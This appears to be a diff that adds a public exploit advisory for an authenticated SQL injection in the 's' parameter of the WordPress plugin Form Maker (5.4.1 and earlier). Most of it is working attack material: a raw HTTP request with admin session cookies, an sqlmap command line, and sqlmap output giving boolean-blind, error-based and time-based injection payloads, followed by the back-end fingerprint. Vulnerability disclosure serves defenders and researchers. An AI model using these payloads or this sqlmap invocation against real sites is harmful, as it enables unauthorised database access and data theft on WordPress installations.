@@ -1,0 +1,56 @@
+# Exploit Title: Wordpress Plugin Form Maker 5.4.1 - 's' SQL Injection (Authenticated)
+# Exploit Author: SunCSR (Sun* Cyber Security Research)
+# Date: 2020 - 5 - 22
+# Vender Homepage: https://help.10web.io/
+# Version: <= 5.4.1
+# Tested on: Ubuntu 18.04
+
+Description:
+SQL injection in the Form Maker by 10Web WordPress Plugin before 5.4.1
+exists via the /wordpress/wp-admin/admin.php?page=blocked_ips_fm&s=1" s
+parameter.
+
+Poc:
+GET /wordpress/wp-admin/admin.php?page=blocked_ips_fm&s=1" HTTP/1.1
+Host: test-wp.com
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101
+Firefox/76.0
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie:
+wordpress_a1c6f59e10f34b6016913b2f9ff0346f=admin%7C1590313373%7CtioKZPEQ9lGWkoMcKGK2qjTp8kepuU9cqticECRXZ79%7C96d43f4ee5cf009365c9722f461d538f96a62637094759cb6fb7a9f54edac171;
+wordpress_test_cookie=WP+Cookie+check;
+wordpress_logged_in_a1c6f59e10f34b6016913b2f9ff0346f=admin%7C1590313373%7CtioKZPEQ9lGWkoMcKGK2qjTp8kepuU9cqticECRXZ79%7C9a63283d84855ed6eeae8e4b5f3a405fba003ddd15748bf5cdca5caaca228a19;
+wp-settings-1=libraryContent%3Dbrowse; wp-settings-time-1=1590140574;
+PHPSESSID=5bpdr8tbj5furvccoadjjj2sgb
+Upgrade-Insecure-Requests: 1
+
+SQLMap using:
+sqlmap -u '
+http://test-wp.com:80/wordpress/wp-admin/admin.php?page=blocked_ips_fm&s=123'
+--cookie='wordpress_a1c6f59e10f34b6016913b2f9ff0346f=admin%7C1590313373%7CtioKZPEQ9lGWkoMcKGK2qjTp8kepuU9cqticECRXZ79%7C96d43f4ee5cf009365c9722f461d538f96a62637094759cb6fb7a9f54edac171;wordpress_test_cookie=WP+Cookie+check;wordpress_logged_in_a1c6f59e10f34b6016913b2f9ff0346f=admin%7C1590313373%7CtioKZPEQ9lGWkoMcKGK2qjTp8kepuU9cqticECRXZ79%7C9a63283d84855ed6eeae8e4b5f3a405fba003ddd15748bf5cdca5caaca228a19;wp-settings-1=libraryContent%3Dbrowse;wp-settings-time-1=1590140574;PHPSESSID=5bpdr8tbj5furvccoadjjj2sgb'
+
+Parameter: s (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: page=blocked_ips_fm&s=-1027" OR 8913=8913#
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP
+BY clause (FLOOR)
+    Payload: page=blocked_ips_fm&s=123" AND (SELECT 2867 FROM(SELECT
+COUNT(*),CONCAT(0x717a707871,(SELECT
+(ELT(2867=2867,1))),0x71787a7671,FLOOR(RAND(0)*2))x FROM
+INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- TxQH
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: page=blocked_ips_fm&s=123" AND SLEEP(5)-- oPEC
+---
+[17:20:17] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.29
+back-end DBMS: MySQL >= 5.0
